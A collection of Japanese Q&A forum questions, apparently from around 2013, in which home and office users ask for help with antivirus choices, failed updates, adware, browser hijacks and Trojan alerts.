前回と同じ質問ですが 自分の個人のパソコンが異様に重いです そこで例えば、Windows　Ｕｐｄａｔｅを毎日しますが 悪意のあるソフトウェアの削除ツール x64 - 2013 年 9 月 (KB890830) インストール日時: ‎2013/‎09/‎12 15:30 インストール状態: 失敗 エラーの詳細: コード 80090017 更新プログラムの種類: 重要 などのように、重要なプログラムだけインストールできません どうすれば、Windows　Ｕｐｄａｔｅがインストールできるのか 知りたいです よろしくお願いいたします
ノートン インターネットセキュリティ 2011を使っています。 IEでは表示が遅くなったため、試しに初めてgoogle chromeをインストールして使い始めました。 そして、IEのようにいちいちノートンのツールバー（？）の表示が出なくなったのですが、chromeでも悪質なウィルスサイトを開いた時はnortonが働いて守ってくれるのでしょうか？初歩的な質問で申し訳ありません。
パソコン初心者です。 起動直後にはアイコンやタスクバーが表示されるのですが、 偽セキュリティソフトらしきウィンドウが表示された後インターネットが勝手に開き、アイコンとタスクバーが消えてしまいます。画面上での右クリックも反応しませんでした。 Alt+Ctrl+Deleteで再起動しても同じでした。 起動直後にペイントソフトを立ち上げてみましたが、やはり偽セキュリティソフトのウィンドウが表示されると同時に見えなくなってしまいました。 再起動をしようとするとそのペイントソフトが終了していないというメッセージが出るので、 ソフトが強制的に終了させられているわけではないようです。 検索しても似たような事例は何件か見つかるものの、ぴったり同じではなく不安になったので質問させていただきました。 原因、対処法、ウイルスが関係しているならば駆除方法を教えて頂ければ幸いです。 カテゴリ違いでしたらすみません。
ネットをしていて、「トロイの木馬」に感染したページに当たってしまったらしいです。 一応セキュリティソフトで隔離できたので、今のところHD等には影響ないようです。 ただ、PCを起動すると、毎回、セキュリティソフトが 「トロイの木馬の感染をブロックしました」というような表示を出します。 また、HPのアドレスが書かれた、真っ白な画面も立ち上がります。 その画面を最初に消し忘れると、勝手に消えはするのですが、 その跡がデスクトップに白く残ってしまいます。 この変な画面が出ないように、またいちいちトロイの木馬が来ないようにするには、 一体どうすればいいのでしょうか？ 舌足らずな説明かと思いますが、どうか意を汲んでいただき、 ご回答いただけたら幸いです。 よろしくお願いいたします。
古いノートパソコン（ウインドウズXP２００４年製）を仕事だけに使おうと思い、ネットにはほとんど接続するつもりはありませんがとりあえず無料のセキュリティソフトを使おうと思っています。 そこで質問ですが皆さんの使ってる無料のセキュリティソフト（ファイアーウォールなども含め）を教えてください。過去にもこのような質問はありましたが2013年現在のを聞きたいので質問しました。 ※無料版などを否定するだけのコメント、難しい専門用語だけをひたすら出してくるコメント、自分にあったものを自分で調べろとソフト一覧が出ているサイトのリンク付でのコメントなどはパスしてください。あくまでも現在使っているもの回答してもらいたいです。よろしくお願いします。
PCを買った時についてきたアンチウィルスが１週間後に切れるのですが、 これをアンインストールして新規で他のアンチウィルスに乗り換えるなんて事は可能ですか？ またオススメのアンチウィルスがあれば教えてください。 ちなみに現在使用中のものはマカフィーです。 使用中のPCはMMOで遊ぶ、動画を観覧する等の娯楽用PCです。 よろしくお願いします。
インターネットを使用する上で、PCに何らかのウィルス対策ソフトを入れるのはいわば常識だと思っていたのですが、先日、同僚の一人が意図的に対策ソフトを入れないようにしているということを知り、驚きました。 理由を尋ねたところ、「メッセージが頻繁に出てうっとおしい」また「PCの動作が遅くなる」と言っていました。メッセージの表示はある程度仕方がないとは思いますし、設定で最小限の表示にもできるかとは思います。 それに、PCの動作が遅くなるのは、また別問題なんじゃいないかと思いました。 私は、現在ウィルスバスターを使用していますが、PC動作が遅くなったりしたことはありませんし、メッセージも頻繁には出てきません。ウィルス対策ソフトを入れるように説得したいのですが、当方もそんなに詳しくないので、どのように話をしたら納得してもらえるのかお知恵を借りたいと思います。 要点は、 １、ウィルス対策ソフトを入れないことの危険性を具体的に知ってもらうこと ２、PCへの負荷が高いっていうのは思いこみ（問題は他にあって、対策ソフトのせいじゃない） ３、周囲に配慮していないことを認識してもらうこと なんじゃないかなと思っています。 でも、こちらも専門的な知識に欠けていて、上手く説得できそうにないので、どう話したらよいのか教えてください。 ちなみに、ファイルやデータのやり取りを頻繁に行わなければならない人なだけに、こちらとしてはとても怖いです。ネットを介した添付書類はサーバーでのチェックがあるから平気かな？と思いますが、USBメモリなどの直接的な接触は危険な気がしますが、どうなんでしょうか？
ウィルス対策ソフトでウィルスを検知しましたが、一見みると「悪意のある実行ファイル」ではなく、ずーっとまえからよく使用し保存していた実行ファイルなので誤検知かと思ってました。一方で、誤検知でなければウィルスに感染したかもしれないとは思ってるのですが、ウィルスそのものをハードディスクから排除しても感染されたファイルがそのウィルスと同じ動作をしたり怪しげな動きをすることもあるのではないかとふと思ったのですが、そういうことはありえなく誤検知なのでしょうか。よく「ファイルが感染された」と言いますよね。感染されたファイルは具体的にどうなってしまうのでしょうか。千差万別ですか？できれば具体的にどうなるのか１つで結構ですので教えてもらいたいです。
こんにちは。 ある特定のサイトを「このサイトは表示できません」という風に閲覧できないよう規制する設定というものはありますか？
今現在「カスペルスキー」を使っているのですが、今月期限が切れるので改めて「どのソフトがいいのかな？」と思っています。　やはりカスペルスキー？　ノートン？　 どれがいいのかアドバイス下さい。 PCはノートPCのwindows7と８の２台です。
ウィルス対策ソフトを導入しても、OSのセキュリティホールが開いてるとそこからウィルスが入ってくることはあるのですか？ふとした疑問です。
ウィルス対策ソフトの検知率がランキングされてますが、ふとした疑問です。検知率が高いソフトと低いソフトの検知率の違いがいまひとつわかりません。 どのウィルスをつかまえるかがウィルス定義で決められ随時更新されていると思いますが、検知率が低いウィルス対策ソフトであっても、「検知率が高いソフトで捕まえられるウィルスの範囲が検知率が低いソフトではいつまでも発見されることがない」なんてことはあるのでしょうか。 いまアビラというのを使ってますが、これは検知率が低いそうですがこのくらいのだと検知率が一番高いものと比べてそんなに差はありませんか？無料のではアビラが精一杯(検知率が一番高い)でしょうか。セキュリティエッセンシャルズというのがありますが、あれは自分はｘｐですが重すぎてやめました。 アビラが検知率が低いと言われながらも使っていました。そのうち新しいファイルが更新されるのでそれまで検知できなかったウィルスも、「検知率が高いソフトで検知するウィルスの範囲」を補ってくれると思っていましたがその認識は間違ってますか？ソフトによってさまざまですか？
パソコン自体は、セキュリティーソフトも入っており、動作は問題ないのですが、すべてのファイルがＤＬ出来ません！ 保存をクリックすると、ＤＬの表示と追跡が出て、赤字にて、このファイルにはウイルスが含まれていたため 削除されました。と表示が出てしまいます。 別のＰＣでは、問題なくＤＬ出来ます。 ＩＥをＵＰしてからだと、思います。 解決方法が、有りましたら、ご伝授願います。
この度事務所のパソコンを一新する為セキュリティソフトを検討しております。 自宅でも使用しているノートンを検討しておりますが購入前に何点化か疑問点がございましたので ご存知の方いらっしゃいましたらご教授願います。 ・導入予定台数は20台を予定しておりますが、ノートンオフィスパックが10台分までしかないのでしょうか？ ・パッケージ版とＤＬ版とございますが差はありますでしょうか？ ・ＨＰを見る限りノートンセキュリティがございますがこれはインターネットセキュリティとは違いがあるのでしょうか？？ 御手数おかけいたしますがよろしくお願いいたします。
はじめて投稿します。 PC起動後、毎回のようにシステムエラーが出てきます。（画像添付しています。） エラー表示はOKをクリックして表示を消すと、その後は出てきませんし、PCを使用するうえで、全く問題はありません。 ですが、毎回表示されるのが嫌なので色々試した結果、お手上げ状態なので教えて頂けますでしょうか。 昨日の朝、PCを起動した時に、いきなり「ウィルスを検知しましたが直前で保護しました」となりまして、 それ以降、PCを起動するたびに上記の状況になります。 スタート→プログラムとファイルの検索→msconfig→スタートアップ　の中で自動起動しようとしている何かがあるのか調べましたが、それらしい物は見当たりませんでした。 ウィルスソフトはアバストの無料版、PCはThinkPad T430sを使用しています。 どうかよろしくお願いします。
今ふと思ったのですが、Windows 7ってSP1以前の更新プログラムとSP1以降の更新プログラムを全てインストールしておけば、SP1って今すぐに(緊急に)インストールしなくてもセキュリティ的には大丈夫なんですか？ あと、フレッツウイルスクリアっていうセキュリティ対策ソフトも、今すぐに(緊急に)最新版にアップグレードしなくても、セキュリティ的に大丈夫なんですか？ 疑問なので至急回答お願いします。
僕の会社用パソコン(デスクトップ)に、上司のUSBを差込み、 USBの中にあるフォルダを開きPC内部のデーターをコピーしました。 そして、USBを正しい方法で抜いた後、パソコンが重くなりました。 一度再起動をかけたのですが、重いままのため、 タスクマネージャーを立ち上げると　「dxqdpo.exe」　というプロセスが CPUの40%以上を占めていました。 どこのサイトを調べてもこのプロセスについては何も表示されず、困っています。 情報をお願いします<(_ _)> 状態 神出鬼没　出ては消え、消えては出るを繰り返す パソコンが重くなり動きにくくなる タスクマネージャーでプロセスを消そうとすると「アクセス拒否」 プロセスツリーの終了をしても消えません。 プロセスエクスプローラーProcess Explorerを開き、そこから Kill Processで消そうとしても「アクセス拒否」となりました 環境 Windows XP
ＩＲＰフック　c:\windows\system\drivers... という脅威が６０個近くでてきました。 これはウイルスなのでしょうか？　　削除してだいじょうぶでしょうか？ 知識がないので　どなたかご存じの方教えていただけたらと思います。　よろしくお願いいたします。
パソコン初心者です。 この度、提供が開始されたウイルスバスタークラウド最新版にアップグレードしたところ、 「ブラウザの保護を有効する」と表示が出て、Google ChromeのTrendツールバーを 有効にするように指示が出ましたので、その指示通り作業しましたが改善しませんでした。 なお、Google Chromeのバージョン は「29.0.1547.76 m」で最新版です。 そこで、提供元のサポートに問い合わせたところ、下記のような回答がありました。 （要旨） ・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・ ウイルスバスタークラウドはGoogle Chrome Ver.10.0から Google Chrome Ver.28.0に対応しておりますので、Google Chrome Ver. 29.0が ウイルスバスタークラウドの動作環境外ございます。 そのため、弊社といたしましては、ウイルスバスタークラウドの環境内の Google Chrome ご利用をお勧めさせております。 お問い合わせいただきました件ですが、お役に立つことができず 大変申し訳ございませんでした。 ・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・・ この回答では解決しませんので、質問致します。 ウイルスバスタークラウド最新版が、グーグルクローム最新版に対応していない というのは納得できないところですが、 セキリュティ上、問題があるのなら。Google Chromeをダウングレードした方が、 よいのでしょうか？ あるいはそのままでも、問題ないのでしょうか？ また、Google Chromeをダウングレードすることはできるのでしょうか。 よろしくご指導のほどお願いいたします。
パソコンをリカバリー後、セキュリティ対策ソフトをアップデートして、Windowsの更新プログラムをインストールするのですが、この時、セキュリティ対策ソフトをアップデート中に、ウイルスなどが、Windowsの脆弱な所から密かに侵入したりしないですか？ 私は、先にセキュリティ対策ソフトのアップデートをしてから、次に、Windowsの更新プログラムをインストールしようとしています。 セキュリティ対策ソフトのアップデート中は、まだWindowsの脆弱な所が修正されていないので、ここからウイルスが侵入しますか？ あと、私のセキュリティ対策ソフトは、フレッツ・ウイルスクリアを使っていて、アップデートする時は、最初に、アップデートセンターに接続して、次に、アップデートデータをダウンロードして、3番目に、アップデートデータをインストールして、4番目アップデートデータを適用するのですが、アップデートセンターに接続中と、アップデートデータをダウンロード中と、アップデートデータをインストール中に、ウイルスに侵入される事ってありますか？ 質問がたくさんありすぎてすいませんが、教えて下さい。お願いします。
google chrome がウイルス対策に誤ってブロックされてしまって使えません。どうしたら解除出来ますか？教えてください！ ちなみにセキュリティーソフトはマイシールドです。マイシールドのウイルス対策で通知が来たときに遮断してしまいました。 アドバイスよろしくお願いします！
インターネットを開くと、タブにsweetimが必ずでるので、色々検索しまして、sweetim削除を行いましたが、なかなかできません。windows7使用してます。　セーフモードからregeditから削除とかやってみましたが、コントロールパネルにもsweetimの名前がなく、ファイル名から検索すると確かにｃドライブプログラムファイルのところにおさるのsweetimがあるので削除しようとしましたが、別のプログラムが開いているので削除できませんとメッセージがでます。 一度システムの復元で10日前に戻すと出なくなったのですが、windows updateをしたらまた出始めました。どう対処したらよいのか教えて下さいませんでしょうか？ 当方パソコン詳しい方ではありませんので、できればわかりやすく教えて頂けるとありがたいです。
３か月前にパソコンを買換え、すでにPCに入ってるウィルスバスター　３か月無料体験版が今日で終了します。　それに代わって.二日前に購入したESET　セキュリティをインストールしたところ、なぜかうまくいかなく、とうとうPCがまったく動かなくなりました。 仕方なくPCを初期化したら、PCに入っっていた３か月無料体験版のウィルスソフトの表示が新規のときと同じく３か月無料体験で１２月中旬まで有効との表示が出てました。　このまま使ってその間になにか良いソフトをゆっくり探すつもりでいましたら、ウィルスバスターからメールが来て今日で体験版終了とのこと。　しかしパソコン初期化により１２月まで使えるとの表示が出ていましたが、このまま使い続けても大丈夫なのかどうか知りたいのですが、教えていただけますか？ よろしくお願いいたします。
今日20時半頃、 パソコンでネットを使用していたところ、 （ユーチューブを見ながら（いつもの動画）いろいろ検索していただけで、 メルマガは受信したようなきもしますが、 何かをダウンロードしたりはしていません） いきなりパソコンがちょっとおかしくなったというか、 いつもTOPページがyahooなのに、 aboutblankと出て真っ白の画面表示に。 さらにエラーめせーじがいくつか出て、 ちょっとバタバタしていてちゃんと読まずにその場を離れ、 2時間して戻ると、 ウイルスソフトで、 ウイルスを削除しましたの表示が。 その後も１０分おきに、おなじURLから攻撃されてブロック表示。 一回再起動したら、 ディスクトップの画像が消えていて、 新しいファイル（既存ファイルのショートカット）がたくさんできていました。 ウイルスソフトで再スキャンしましたが、 ウイルスはみつからないの表示。 ただ、再起動のたび、 ホーム設定のyahooが消えてしまいます。 これは感染しているのでしょうか。 仕事で使うので困っています。
フリーソフトのimgburnをDLしexeファイルを開いたら、avast!がマルウェアを検出しました。 ブートタイムスキャンをしたところ、２つのファイルが感染していたので、削除しました。 念のため、もう一度ブートタイムスキャンをしましたが、感染しているファイルはありませんでした。 このほかに、どのような対処をしたらよいでしょうか おとなしくリカバリしたほうがいいんですかね？ 検出されたウイルスはwin32:IBryte-BGとwin32:Installer-Kというものです。
Vista以降のwindowsでアップデートはすべて最新の場合でです。 ゲストアカウントは標準や管理者と比べて権限が制限されてると聞きます。 ならばPCの所有者であってもゲストアカウントを常用すればPCをより安全に使用できますか？ 逆にゲストを常用することにリスクはありますか？
職場のｐｃでワンクリック表示がでるようになってしまいました。 ネットワーク管理されているので、レジストリ等をいじることができません。 内容が内容なので、管理者に相談するわけにもいきません。 削除する方法はないでしょうか。 難しい質問ですが、気長に回答をお待ちいたします。 よろしくお願いします。
ヤフオクをやってみようと進めていますが、昨日のテレビで「ケーブルに繋がれていればハッカーはあらゆるPCにアクセスできる」みたいなことを言っていました。 今までプライベートなPCの為、仮に覗かれたところで都合の悪いものは入っていませんでしたのでフリーソフトで対策したつもりになっていましたが、小さくとも商取引をするとなると相手もいることですし、迷惑をかけるといけませんので一通りのセキュリティソフトは入れようと思っています。 PCも商取引専用を用意して不用意に未確認なサイトやメールは開けないようにしようと思っています。電源ボタンでサスペンドにしてこまめに電源も落とそうと思っています。しかし、テレビでは遠隔操作で電源さえ入れるようなことを言ってましたから、サスペンドしてても無力でしょうが、それでもそれなりのスキルと時間がかかるでしょうから、およそ私のPCがターゲットになるとは考えられませんのでそこまでは気になりません。しかし何か玄関が開けっ放しになってるみたいに不安です。 そこで質問なのですが、サスペンドにするというのはセキュリティ的にはどんな状態でしょうか？たとえば家で言えばどんな状態なんでしょうか。玄関に鍵がかかってて雨戸もしまって中をまったく覗けないのか、玄関はしまっててもガラス張りで中が丸見えとか、あるいは玄関も閉まってないとか。 高度なスキルを持った相手にはいずれにしても無力でしょうが、通常どういった対策をするのでしょうか。
とあるサイトからソフトをダウンロードしたらSystweakも同時にダウンロードしてしまいました 削除するにはどうすればよろしいでしょうか？
教えてください 昨年ノートンのセキュリティー３年間を購入してパソコンに入れました まだ期限が切れるはずないのに　期限切れのため購入するようにとメッセージが出ます。 なぜなんでしょうか？
　パソコンを立ち上げて、何かソフトを使っていると、インターネットに接続し（窓に「ad.yieldmanager」と書かれている）、「RegClean Proでウィルスからパソコンを守ろう」とかいう広告が開かれます。数日前にフリーソフトをダウンロードしてから、この症状が起きました。 　このサイトに通じてしまうウィルスファイル（？）を除去（アンインストール？）しようと、パソコンのスタートボタンの「検索」で「RegClean Pro」を探して見ますと、WINDOWSのディレクトリの下位にある「Rｅｇ」が検出されますが、WINDOWSに入っているものをアンインストールしても大丈夫なのかと心配で、除去できません。わずらわしくて仕方のないこのネット広告をどうしたら除去できるのでしょうか。
会社で symantec endpoint protection のクライアント用をインストールしましたが， 管理者用から上司にアプリケーションの起動履歴やインターネットのアクセス履歴がつつぬけになるのでしょうか？
先ほどトロイの木馬で質問した者です。 不安でしたので、Emsisoft Anti-Malware　無料の非常駐型のセキュリティーソフトで検索したところ、 4件の脅威が発見されました……が、……。 その4件が下記です。 C:\ProgramData\Kaspersky Lab\AVP13\QB\01f4596f4821024f.klq -> (Quarantine-6) 検出: Gen:Variant.Adware.BHO.Bprotector.1 (B) C:\ProgramData\Kaspersky Lab\AVP13\QB\8780e72a55f5c9f7.klq -> (Quarantine-6) -> (NSIS o) -> lzma_nsis0005 -> protector.dll 検出: Gen:Variant.Adware.BHO.Bprotector.1 (B) C:\ProgramData\Kaspersky Lab\AVP13\QB\8fbba17e62e34190.klq -> (Quarantine-6) -> (NSIS o) -> lzma_nsis0005 -> protector.dll 検出: Gen:Variant.Adware.BHO.Bprotector.1 (B) C:\ProgramData\Kaspersky Lab\AVP13\QB\bd5abd1082b20677.klq -> (Quarantine-6) 検出: Gen:Variant.Adware.BHO.Bprotector.1 (B) これは、どう解釈すればいいのでしょうか……？ まさか、常駐しているカスペルスキーの中……？
windows8購入時ウイルスバスターの無料版をインストールしました。NTTのセキュリティに変更したいのですがうまくいきません。ウイルスバスターをアンインストールしたいのですが。。。　 初心者で用語もあまりわかりませんが、よい方法を教えて下さい。
カスペルスキー2013　を使用中です。 先ほど突如として、トロイの木馬を検出したため、カスペルスキーが駆除してくれました。 最近、Windowsの更新をしたことくらいしか記憶にありません。 しかも、トロイの木馬（Trojan.Win32.Generic）は、４つ。 どれも、AppData\Local\Temp　の先にあった \EB1A.tmp//pack 2.6.1673.238.7z//protector.dll それと、 \nssF93D.tmp\rjatydimofu.exe と言うファイルの中にいました。 すでに削除されてありませんが、これがどこからきたのかわかりません。 しかも、この「EB1A」だけを検索すると、visaカード……うんたらかんたら……。 それに、「rjatydimofu.exe」を調べると、何故かトレントのファイルがヒットします。 ちなみに、このようなことは僕のパソコンではしていませんし、ダウンロードもしていません。 つい最近、ひま●り動画で動画を見ようとしたところ、なぜかトロイの木馬を検出したことがありましたが……。 ネット上でvisaカードを使ったことのある自分としては、怖いです。 自分には、これ以上どうしようもないので、これからどうするべきか教えてください。 これは結局大丈夫なのでしょうか？
管理者権限でカスペルスキー完全スキャンするのと、ゲストアカウントでカスペルスキー完全スキャンでは、スキャン（アクセス）できるファイルに違いはありますか？ 完全スキャンは使用するアカウントによって性能は異なりますか？
急にfirefoxのホームページがgoogleから別のサイトに変更され、右クリックによる文字検索が「googleで検索」から「Conduit searchで検索」に変更されてしまいました。 変更されたホームページはbing系の検索エンジンサイトだったと思います。 キャプチャーを撮っておかなかったので、どこのサイトだか分かりません。 一応設定からgoogleをホームページに登録しなおし、怪しそうなプログラムがあったのでアンインストールしておきました。 このプログラムの名前も控えていません。 しかし「Conduit searchで検索」が相変わらず元に戻りません。 何かしらのマルウェアに感染したのではないかと疑っているのですが、どう対処したらよろしいでしょうか？
PC　パソコン工房製デスクトップ ＯＳ　7 Home Premium(64bit) メモリ　4GB セキュリティソフト　ウイルスセキュリティゼロ 　足りない情報がありましたらご指摘下さい。 　上記のPCで先日ウイルスセキュリティゼロのメッセジーにて、「trojan(00403a7a1)」を見つけ削除しました。と言うアラートが出現しました。ファイル名は「cm7.exe」。tempフォルダに作成されます。 　それ以後、約５分ごとに同じメッセージが表示されて困っています。 　自分で試した事は、セキュリティゼロのページで紹介されていた対応方法を試しました(下記URL参照)、次に、セーフモードでMicrosoft Security Essentialsによるスキャンも試してみました。 　後者は１つのアドウェアを検出しましたので削除しましたが状況は変わりませんでした。 ネットワークを切断している時は上記のメッセージは出てきません。 　下記のURLにて、セキュリティゼロの対応方法を試してみましたが、何も検出されず、レジストリも該当するものがありませんでした。 http://www.sourcenext.com/security/vsinfo/001325 … 　極力、クリーンインストールはしない方向でやりたいと思っておりますので宜しくお願い致します。
パソコンのトップページのタスクバーにパソコンのアイコンがいつもあります　（ネットワーク２　インターネットアクセスの表示あり） 家で一人が使用しているＰＣなのに　他人に入り込まれて覗き見られています また勝手に内容を操作されることもあります ノートンセキュリティー360をいれてるのにです　 どうすればよいか教えてください
画像のようなwebページが突如現れ、 対処法が分からず、いつも閉じていて無視しているんですが、 何かプログラムのアンインストールなど、現れない方法があるのでしょうか？ 教えてください。よろしくお願いいたします。
amebloでブログを開こうとすると「blog-apart.com」というサイトに誘導されてしまいます。 どうやらアクセス解析で「ページ別アクセス数」のリンクをクリックしてからこの誘導が始まったように思われます。 どなたか解決方法をご存じないでしょうか？ ちなみに履歴やクッキーは削除済みです。
パソコンを購入してまだ半年です。子供も動画やゲームを楽しみましたが、私もオークションを始めていたので使ってました。 パソコンを開いていつもと同じようにyahooにつなげようとしたらウイルスに感染しているといった画面が出てきました。わけわからずで何度やり直してもだめでした。検索するとウイルス対策に欠かせないものがあるらしく購入する画面が出てきて、こんな何か解らないもの買えといわれてもと思い購入はやめました。 仕方ないので問い合わせの電話をかけて説明したら「それはきっと嘘のウイルスを流されてますね」と言われました。動画などで無料で見れると言いクリックすると自動的に嘘のウイルス画面を流されるということでした。 たぶん子供が動画を見てたからそれで入ったと思います。 それからその対応してくれた方の言うとおり電話口でもとに戻す操作を教えてもらったのですがどれもだめで、重要なプログラムがないなら初期化しましょうと言うので初期化しました。 およそ電話の操作作業時間は2時間半くらいかかり、終わった頃にはへとへとで疲れ果てました。 そのあと1週間ほど過ぎた時また今度はページがつながらなくなり、また？と嫌気がさしましたがそのままにするわけにもいかず、また電話で問い合わせして操作方法教えてもらいまた初期化にしました。 さすがに立て続けになるとパソコンを開くのが怖くなりその後1ヵ月ちかく放置です。 でもせっかくパソコンあるのに使わない訳にもいかないと開始しました。 その後はありませんが何かこれさえすればウイルス入ってこない方法ありますか？ 初心者なのでできる限り解りやすく説明してくれるとたすかります。 お願いします。
初めて質問させていただきます。 この度、カスペルスキーインターネットセキュリティ2013を新規で、 PCにインストールすることになったのですが、 何度試しても、画面に「本製品はインストールされませんでした」 とエラーが出てしまいます。 ※インストール先のOSは、Windows７の64bit、 カスペルスキーは、マルチプラットフォーム版を使用しています。 念のため、 ・以前試用していた、アンチウィルスソフトを「プログラムと機能」からアンインストール ・レジストリエディタ内に（セキュリティソフト関係のキーがないか）確認 上記を試し、再度インストールを実行したのですがダメでした。 こちらをご覧になられた方で、同様な経験がおありの方がいらっしゃいましたら、 何かアドバイスをお願いしたいです。どうぞ、よろしくお願いします。m（__）m
ウィルスバスターを使っていますが　「個人情報をブロックしました・・クレジット番号」と出るのですが、 ネット上のあるサイトで買い物をしてクレジットカード番号を入力した場合 その番号は自分のPC内にも保存されているんでしょうか？また、消去する方法はあるのでしょうか？ よろしく　お願いします。
ノートパソコンのウイルスについて。今はお試しのウイルスバスターを使用していて、まもなく終了します。フレッツのウイルスクリアかウイルスバスターのどちらがお薦めですか？値段など安いのが良いです。また、他に良いのがありましたら教えて下さい！
ノートンのウイルスソフトの有効期限が切れました。 代わりにWindows8のディフェンダーというものを使ってますが、これだけで安心できるのでしょうか？
特定の会員のマイページに何らかの仕組みを導入していませんか。何ですかと聞かれても答えません。私は削除されたりするのですが、ついにでしょうか、管理者側によっていじくられています。情報収集以上のモノを特定の会員に対して組み込んでいますよね。妄想ではありません。思い当たる節のある冷静な専門家の方に回答いただきたいです。サイトで管理人をされていたとか。 こうしたサイトがこそこそやっている事を教えてください。
http://oshiete.goo.ne.jp/qa/8252364.html　この質問なんですが。 ＞＞不正に改ざんされたサイトにバックグラウンドで攻撃サイトに誘導するようにスクリプトが設置されます その改ざんしたページに直接ウイルスを置かず、別のサイトに誘導する理由は何ですか？ ＞＞本来の処理手順にはないジャンプが起きシュルコードとよばれるものが発動 ジャンプとは何ですか？またシェルコードとは具体的に何で、それが発動する理由は何でしょうか？ URLを見てもわかりません。初心者向けにわかりやすく解説してください。
スマホにインストールしているウイルスバスターの期限がくるので更新しようと思っています。 ただ、ウイルスバスターのアプリから2年契約するよりも、楽天市場やyahoo!ショッピングなどで新たにウイルスバスターを購入する方が安く済みます。 新たに買ってインストールしても問題ないでしょうか? 詳しい方、教えてください。
Internet Explorer,Mozilla Firefoxを使用中にPCAnalysis.net という自動セキュリティースキャンの バナーらしきものが出ます。ウイルスソフトでしょうか？ PC.Anaｌysis.net　Scan　your pc Security画面が表示され Scanning PCforpotential　threats Scan　Now　と言う文字の下の青四角い印が慌ただしくずっと点滅し続けます。 その都度×ボタン押して終了させているのですが、とてもうっとおしいです。 何かプログラムのインストールをした時からだと思いましたので システムの復元をしたのですが、解決しませんでした。 「プログラムの追加と削除」でその項目が見当たりません。 画面上や、タスクバーに現れている時はパソコンの動きが非常に遅くなります。 表示されなくするにはどうしたら宜しいでしょうか？ どなたか削除の方法をご存知の方がいらしたら教えて下さい。 よろしくお願い致します。 FMV-E8200　Windows XP　です。 5年前に中古を購入致しましたので、リカバリソフトがありません。
このカテゴリーで、ウイルスに感染するとファイアウォールを通過するためデフォルトブラウザを使うことが多いと知りました。 私のパソコンにインストールされているブラウザはInternet Explorer とFirefox で、基本的に使用しているのはFirefoxです。 私のパソコンを見ると [インターネットのプロパティ]-[プログラム]で Internet Explorer は規定の Web ブラウザーです。 となっています。 一方、[プログラムのアクセスとコンピュータの既定の設定]-[カスタム]-[既定のブラウザーを選択してください] では 現在の Web ブラウザーを使う Internet Explorer Mozilla Firefox の3つの選択肢があり、Internet Explorer　ではなく、[現在の Web ブラウザーを使う] が選択されています。 このような条件化では、ウイルスは Internet Explorer と Firefox のどちらを既定のブラウザと判断するのか教えてください。 ウイルスには Internet Explorer をデフォルトブラウザと思わせ、ファイアウォールの設定で Internet Explorer が起動したときには許可するかどうかのポップアップを表示させる設定にして、パソコンがウイルスに感染したかどうかをチェックできる状態にしたいと考えています。
ウィルスバスター2011　クラウドをｗｉｎ７ｈｏｍｅ　６４ｂｉｔで使っています。 重要なメッセージで「ウィルスバスター2011　クラウドを有効にする(重要)」と出ています。 インストールしてからずっとですが、ＰＣ起動時に同時に立ち上がるようになっていましたが、 たまになぜか無効になっており、有効にしたことがあります。 気がつくのはおかしいかもというファイルをダウンロードした時に、ファイルの中身を検索したいので、 そこで無効になっているのに気付きます。 どうして無効になるのか未だにわかりません。 今回は、ＰＣ内をハードをいじったり、アップデートをしたり・・・と、 いろいろ設定が変わったので、その関係で何か不具合が起きたのかとも思いますが、 重要なメッセージから有効にすると、このプログラムの変更許可・・・と出てくるのでＯＫにするのですが、 アイコンをクリックしても「保護を開始しています・・・」ということだけで、 ウィルスバスター2011のメニューなどが出てきません。 これってたぶん、まだ保護は開始されていない状態なのだろうと思います。 どうしたら、復旧できるのでしょうか？
テキストファイルはどうして脆弱性攻撃にさらされることがほかの形式と比べて少ないのかという疑問です。 過去質問で見た気がするのですがキーワード検索しても見つけられません。 回答、過去質問のURLどちらでもいいのでご存知でしたら教えてください。
http://synclogue-blog.com/new_windows/ 上の記事によると。 ８．１でwindows defenderにネットワーク挙動監視機能が追加されたようです。 この機能の詳細、市販有料製品の機能とどう違うのか、教えてください。
最近 ブラウザのサイドの部分、トップの部分に ディスクの空き容量が非常に低下してきています。 お使いのPCの動作が遅いです。 システム内でスパイウェアが検出されました。 Windowsのエラースキャンをおすすめします たった２分間でWindowsのエラーを修正してPCが新品同様に作動できるようにしましょう。 というような文言のチカチカする広告が出るようになりました。 リンク先は以下のようなサイトです。 http://systweak.com RegClean 同時に、 Webサイトの少し難しいような単語に2重下線が引かれていて ポイントするとポップアップも出るようにもなりました。 リンク先は MonsterMarketplaceというところで 単語の意味を解説してくれるようなところではありません。 少し前に よくわからないファイルをインストールしてしまって すぐに全てアンインストールしたと思っていたのですが、 もしかしたらそれが原因かもしてません。 それで、 サードパーティ製のCookieをブロックし、 アドオンも不審なものがないかチェックしたのですが 改善されません。 また、 サードパーティ製のCookieをブロックしていると FFではYahooツールバーがうまく機能しなかったり、 ブラウザのバックボタンが2クリックしないと機能してくれなかったりして困っています。 環境はIE,FF, Chromeではページ遷移すると小窓でADが出たりして いろいろ試してみたのですが 中々対処できず困っています。 詳しい方がいらっしゃいましたら ご教授お願い致します。
宜しくお願いします。 対策ソフトをすり抜けさせるみたいなことが書いてあったんですが、具体的にはどういったことなんでしょうか。
freemakevideoをインストールしたらＩＥが反応しなくなりました またスパイウエアが検出されましたとの警告が出るようになりました IE１０を再インストールするにはどうしたらよろしいですか 以上よろしくお願いいたします
ウイルスバスターを使ってます 一ヶ月分のスキャンの回数と 発見された脅威の数など 毎月レポートが出てくるようです リアルタイムスキャンになっているはずなのですが 先月分はスキャンした回数が0でした リアルタイムスキャンとは自動的にスキャンしてくれるものではないのですか？ それとも毎月出てくるレポートには手動でスキャンした数のみのるのでしょうか？ 先々月はスキャンした回数があったような気がするので 現在きちんと保護してくれているのか不安になりました わかる方教えてください
はじめまして、PCなど不慣れなもので不快な思いをさせてしまったらすみません。 とあるネット配信者のことを検索していたら、winny-streetgalsというサイトにいきつきました。「Winny」というのは以前問題になったのを耳にしたことがあり調べてみると、自分のパソコンのデータがネット上に出ると言うのを知りました。 上記のサイトで画像をクリックして開いてしまったのですが、わたしのPCも感染してしまったのでしょうか？不安で不安でしょうがありません。※ウィルスバスターは入っております。 呆れるかもしれませんが、お答えいただけたらと思います。
